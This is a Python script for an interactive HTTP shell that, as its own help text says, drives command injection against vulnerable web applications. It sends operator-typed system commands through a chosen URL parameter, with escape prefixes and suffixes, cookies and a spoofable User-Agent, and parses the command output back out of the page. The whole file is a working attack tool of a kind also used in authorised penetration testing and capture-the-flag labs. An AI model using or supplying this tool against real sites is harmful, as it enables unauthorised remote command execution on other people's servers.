import random
import string
import argparse
from html import unescape
import urllib.parse

import requests


# Configuration
address = None
parameter = None
url_encode = True
verbose = False
cookies = None
user_agent = None
prefix = None
suffix = None
no_preflight = False


def voutput(message):
    if verbose:
        print(f'[i] {message}')

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    
    
def extract_markers(response_text, start_marker, end_marker):
    start_index = response_text.find(start_marker)
    end_index = response_text.find(end_marker, start_index + len(start_marker))
    
    if start_index == -1 or end_index == -1:
        return None
    
    return response_text[start_index + len(start_marker):end_index].strip()
    
def send_command(command):
    start_marker = f"--{random_string(8)}--"
    end_marker = f"--{random_string(8)}--"
    wrapped_command = f"echo {start_marker};{command};echo {end_marker}"
    
    if prefix:
        wrapped_command = f"{prefix}{wrapped_command}"
    if suffix:
        wrapped_command = f"{wrapped_command}{suffix}"
    
    if url_encode:
        wrapped_command = urllib.parse.quote(wrapped_command)
    
    url = f"{address}?{parameter}={wrapped_command}"
    voutput(f"Sent command: {url}")
    response = requests.get(url, cookies=cookies, headers={'User-Agent': user_agent} if user_agent else None)
    voutput(f"Status code: {response.status_code}")
    voutput(f"Response size: {len(response.text)}")
    
    if response.status_code != 200:
        print(f"[!] Command execution failed with status code: {response.status_code} and response: {response.text}")
        return None
    
    unescaped_response = unescape(response.text)
    return extract_markers(unescaped_response, start_marker, end_marker)


def preflight_request():
    preflight_random = random_string(16)
    preflight_echo = f"echo {preflight_random}"
    
    response = send_command(preflight_echo)
    if not response:
        print("[!] Preflight request failed: No response received.")
        return False
    if preflight_random not in response:
        print("[!] Preflight request failed: Could not verify command output.")
        return False
    return True


def main():
    global address, parameter, url_encode, verbose, cookies, user_agent, prefix, suffix, no_preflight
    parser = argparse.ArgumentParser(description=" A lightweight HTTP CLI Shell that enables custom command injections into vulnerable web applications with a familiar shell-like interface.")
    parser.add_argument("--address", "-a", help="Target address containing the full path. E.g., http://example.com/vulnerable.php")
    parser.add_argument("--parameter", "-p", help="Parameter name where the injection will occur. E.g., 'cmd' for http://example.com/vulnerable.php?cmd=...")
    parser.add_argument("--cookies", "-c", help="Use cookies for the request")
    parser.add_argument("--agent", help="Set a custom User-Agent header for the requests")
    parser.add_argument("--prefix", "-P", help="Set a custom prefix for the commands. This is usually the command escape. By default there is none. No modifications apply to this, so make sure to encode it properly if needed.")
    parser.add_argument("--suffix", "-S", help="Set a custom suffix for the commands. This is usually the command escape. By default there is none. No modifications apply to this, so make sure to encode it properly if needed.")


    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    parser.add_argument("--no-url-encode", action="store_true", help="Disable URL encoding of commands")
    parser.add_argument("--no-preflight", action="store_true", help="Skip preflight checks and go straight to the shell interface")

    args = parser.parse_args()

    address = args.address
    parameter = args.parameter
    url_encode = not args.no_url_encode
    verbose = args.verbose
    cookies = args.cookies
    user_agent = args.agent
    prefix = args.prefix
    suffix = args.suffix
    no_preflight = args.no_preflight
    
    if not no_preflight:
        is_successful = preflight_request()
        if is_successful:
            print("Connection successful!")
    else:
        print("Skipping preflight checks.")
    
    host_name = urllib.parse.urlparse(address).netloc

    # Shell-like environment
    while True:
        command = input(f"\n{host_name} > ")
        if command.lower() in ['exit', 'quit']:
            print("Exiting shell.")
            break
        
        output = send_command(command)
        if output is not None:
            print(f"{output}")
        else:
            print("[!] Failed to retrieve command output.")


if __name__ == "__main__":
    main()
